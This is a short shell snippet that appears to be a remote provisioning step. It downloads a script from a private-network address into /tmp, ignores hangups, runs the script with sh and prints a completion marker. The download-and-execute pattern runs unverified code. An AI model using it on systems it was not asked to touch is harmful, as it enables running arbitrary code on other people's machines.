wget -q -O /tmp/dwc.sh http://192.168.1.44:18765/_dwc.sh
sed -i 's/\r$//' /tmp/dwc.sh
trap '' HUP
sh /tmp/dwc.sh
echo DWC_DONE
